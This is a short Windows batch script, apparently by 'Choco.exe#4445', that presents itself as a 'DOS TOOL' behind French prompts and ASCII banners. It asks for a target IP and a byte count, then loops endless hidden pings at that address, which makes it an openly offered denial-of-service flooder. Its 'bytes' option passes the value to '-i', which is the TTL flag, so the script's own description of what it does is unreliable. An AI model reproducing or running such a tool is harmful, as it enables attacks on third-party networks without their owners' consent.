@echo off
tile DOS TOOL BY Choco.exe#4445
chcp 65001 >nul
mode 82,24
echo    ██████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ 
echo   ██╔════╝██║  ██║██╔═══██╗██╔════╝██╔═══██╗
echo   ██║     ███████║██║   ██║██║     ██║   ██║
echo   ██║     ██╔══██║██║   ██║██║     ██║   ██║
echo   ╚██████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝
echo   ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ 
                                           
echo.
set /p key=APPUYEZ SUR N'IMPORTE QUELLE TOUCHE POUR CONTINUER...
cls
color 4
ECHO                            [40;31m ╔═══════════════════════╗
ECHO                            [40;31m ║  ╔                 ╗  ║
ECHO                            [40;31m ║       C H O C O       ║
ECHO                            [40;31m ║  ╚                 ╝  ║
ECHO                            [40;31m ╚═══════════════════════╝
set /p IP= [40;37m[[40;31mASTRAL[40;37m] Insert IP: 
echo [IP CHARGER]
set /p BYTES= [40;37m[[40;31mASTRAL[40;37m] Insert Bytes: 
cls
:raven
color 4
echo  ENVOYER UNE REQUÊTE ICMP À %IP%
ping %IP% -i %BYTES% -t >nul
goto raven